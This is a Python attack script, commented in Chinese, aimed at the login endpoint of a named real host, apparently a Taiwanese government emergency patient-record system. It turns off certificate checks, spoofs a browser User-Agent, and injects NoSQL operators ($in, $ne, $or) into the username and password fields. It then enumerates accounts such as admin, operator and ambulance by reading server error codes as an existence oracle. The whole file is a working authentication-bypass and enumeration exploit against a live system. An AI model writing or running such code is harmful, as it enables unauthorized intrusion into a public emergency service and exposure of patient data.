import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=12)
    try:
        r=s.post(BASE+"/login",json=body,timeout=12); return r.status_code, r.text
    except Exception as e: return None, repr(e)

print("=== $in 多值 (走多文档?) ===")
# $in 之前单值=500, 试多值
for vals in [["admin","root"],["admin","user","test"],["a","b","c"],["1","2","3"]]:
    code,t=login({"username":{"$in":vals},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"})
    path="SOURCE-403" if code==403 else ("CRASH-500" if code==500 else f"{code}")
    print(f"  $in {str(vals):24s} -> {code} {path}")
    time.sleep(0.08)

print("\n=== 枚举: 用 $or 精确 username 列表 (403=存在多, 500=无) ===")
# 逐个用户名, 用 $or[{$eq:u}] 单值 -> 看 403(存在)vs500(不存在)
cands=["admin","root","tpf","epcr","operator","dispatch","port","system","test","119","911",
  "admin1","tpf01","operator1","tpfadmin","portadmin","emergency","ambulance","admin2","tpf1",
  "epcr01","user1","operator2","user"]
print("(403=用户名存在且匹配, 500=不存在)")
for u in cands:
    code,t=login({"username":{"$or":[{"$eq":u}]},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"})
    exists="EXISTS" if code==403 else ("no" if code==500 else f"?{code}")
    print(f"  {u:12s} -> {code} {exists}")
    time.sleep(0.06)
print("DONE")
